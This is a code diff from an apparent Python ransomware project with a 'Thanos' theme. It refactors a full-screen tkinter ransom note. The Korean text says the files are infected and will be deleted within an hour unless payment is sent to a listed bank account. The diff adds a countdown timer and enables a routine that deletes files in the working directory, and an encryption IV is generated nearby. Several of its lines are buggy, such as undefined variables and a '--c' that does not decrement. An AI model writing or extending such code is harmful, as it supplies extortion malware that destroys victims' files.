@@ -15,40 +15,43 @@ from PIL import Image, ImageTk
 
 
 # /////////////////////////////////////////////////////////////////////////////////////////////////////////////////gui 관련 함수&코드
-def key_submit():
-    pw = str(password.get())
-    label6 = tkinter.Label(window, text="키가 입력되었다 => "+pw, fg="red", bg="black", font="Helvetica 18 bold")
-    label6.pack()
-    pwbutton.destroy()
-    label4.destroy()
-    password.destroy()
 
-window = tkinter.Tk()
-window.title("ransomware")
-window.state('zoomed')  # maximize the window
-height = window.winfo_height()  # ...
-width = window.winfo_width()
-window.configure(background="black")
+class tk:
+    def __init__(self):
+        self.window = tkinter.Tk()
+        self.window.title("ransomware")
+        self.window.state('zoomed')  # maximize the window
+        height = self.window.winfo_height()  # ...
+        width = self.window.winfo_width()
+        self.window.configure(background="black")
 
-label1 = tkinter.Label(window, text="타노스 랜섬웨어에 감염되었다.", fg="red", bg="black", font='Helvetica 14 bold')
-label1.pack()
-label2 = tkinter.Label(window, text="1시간 안에 돈을 보내주지 않으면 파일이 삭제된다.", fg="red", bg="black", font='Helvetica 18 bold')
-label2.pack()
-label3 = tkinter.Label(window, text="국민 786102-00-040854", fg="red", bg="black", font='Helvetica 18 bold')
-label3.pack()
+        self.label1 = tkinter.Label(self.window, text="타노스 랜섬웨어에 감염되었다.", fg="red", bg="black", font='Helvetica 14 bold')
+        self.label1.pack()
+        self.label2 = tkinter.Label(self.window, text="1시간 안에 돈을 보내주지 않으면 파일이 삭제된다.", fg="red", bg="black", font='Helvetica 18 bold')
+        self.label2.pack()
+        self.label3 = tkinter.Label(self.window, text="국민 786102-00-040854", fg="red", bg="black", font='Helvetica 18 bold')
+        self.label3.pack()
 
-label4 = tkinter.Label(window, text="password:", fg="red", bg="black", font='Helvetica 14 bold')
-label4.pack()
-password = tkinter.Entry(window)
-password.pack()
+        self.label4 = tkinter.Label(self.window, text="password:", fg="red", bg="black", font='Helvetica 14 bold')
+        self.label4.pack()
+        self.password = tkinter.Entry(self.window)
+        self.password.pack()
 
-pwbutton = tkinter.Button(window, text="복호화", command=key_submit)
-pwbutton.pack()
+        self.pwbutton = tkinter.Button(self.window, text="복호화", command=self.key_submit)
+        self.pwbutton.pack()
 
-image = tkinter.PhotoImage(file="../ui/face.png")
+        self.image = tkinter.PhotoImage(file="../ui/face.png")
 
-label5 = tkinter.Label(window, image=image)
-label5.pack()
+        self.label5 = tkinter.Label(self.window, image=image)
+        self.label5.pack()
+
+    def key_submit(self):
+        pw = str(self.password.get())
+        self.label6 = tkinter.Label(self.window, text="키가 입력되었다 => " + pw, fg="red", bg="black", font="Helvetica 18 bold")
+        self.label6.pack()
+        self.pwbutton.destroy()
+        self.label4.destroy()
+        self.password.destroy()
 
 
 iv = os.urandom(16)
@@ -77,12 +80,21 @@ def startTimer():
     #5초에 한번씩 파일 삭제
     #threading.Timer(5,remove_files(os.getcwd())).start()
     sleep(5)
+    c = 5
+    clock(c)
     remove_files(os.getcwd())
 
+def clock(c):
+    if c<=0:
+        return;
+    label_clock = tkinter.Label(window, text=str(c), fg="red", bg="black", font='Helvetica 14 bold')
+    label_clock.pack()
+    threading.Timer(1, clock, [--c]).start()
+
 def remove_files(path,ext=None):
-    #label6 = thanos.AnimatedGIF(window, "thanos1.gif")
-    #label6.pack()
-    #label5.destroy()
+    label6 = thanos.AnimatedGIF(window, "../ui/thanos1.gif")
+    label6.pack()
+    label5.destroy()
     remove_filelist=[]
     print("os.removelistdir(): \n", os.listdir())
     for name in os.listdir(path):
